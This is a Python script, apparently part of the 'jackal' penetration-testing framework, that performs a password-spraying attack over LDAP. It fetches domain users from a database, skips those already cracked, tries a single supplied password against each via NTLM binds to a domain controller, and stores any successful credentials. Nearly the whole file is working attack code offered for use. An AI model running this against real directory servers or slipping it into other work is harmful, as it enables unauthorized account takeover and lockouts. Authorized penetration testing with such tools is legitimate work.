#!/usr/bin/env python3

import argparse

from jackal import Credential, CredentialSearch, HostSearch, UserSearch
from jackal.utils import print_error, print_notification, print_success
from ldap3 import ALL, ANONYMOUS, NTLM, Connection, Server
from ldap3.core.exceptions import LDAPBindError

tag = "ldap_bruteforce"


def bruteforce(users, domain, password, host):
    """
        Performs a bruteforce for the given users, password, domain on the given host.
    """
    cs = CredentialSearch(use_pipe=False)

    print_notification("Connecting to {}".format(host))

    s = Server(host)
    c = Connection(s)

    for user in users:
        if c.rebind(user="{}\\{}".format(domain, user.username), password=password, authentication=NTLM):
            print_success('Success for: {}:{}'.format(user.username, password))
            credential = cs.find_object(
                user.username, password, domain=domain, host_ip=host)
            if not credential:
                credential = Credential(username=user.username, secret=password,
                                        domain=domain, host_ip=host, type="plaintext", port=389)
            credential.add_tag(tag)
            credential.save()

            # Add a tag to the user object, so we dont have to bruteforce it again.
            user.add_tag(tag)
            user.save()
        else:
            print_error("Fail for: {}:{}".format(user.username, password))


def main():
    us = UserSearch()
    domains = us.get_domains()
    if not len(domains):
        print_error("No domains found...")
        return
    argparser = argparse.ArgumentParser(
        description="Password bruteforce via ldap. All users for the given domain are tried, users with an entry in jk-creds will be omitted.")
    argparser.add_argument("-d", "--domain", choices=domains,
                           default=domains[0], help="Domain to retrieve users from, default: {}".format(domains[0]))
    argparser.add_argument("-p", "--password", type=str,
                           required=True, help="Password to try")
    argparser.add_argument("-s", "--server", type=str,
                           help="Server to connect to, if not given, one will be retrieved from jackal.")
    arguments = argparser.parse_args()

    host = ''
    if not arguments.server:
        hs = HostSearch(use_pipe=False)
        host_result = hs.search(count=1, up=True, ports=[389], domain=arguments.domain)
        if len(host_result):
            host = str(host_result[0].address)
        else:
            print_error(
                "No host could be found for domain: {}".format(arguments.domain))
            print_error("Try giving one with -s")
            return
    else:
        host = arguments.server

    cs = CredentialSearch(use_pip=False)
    known_users = set()
    credentials = cs.search(domain=arguments.domain)

    [known_users.add(credential.username) for credential in credentials]

    users = [user for user in us.get_users(
        domain=arguments.domain, tags=['!' + tag])]

    users = [user for user in users if not user.username in known_users]
    bruteforce(users, arguments.domain, arguments.password, host)

if __name__ == '__main__':
    main()
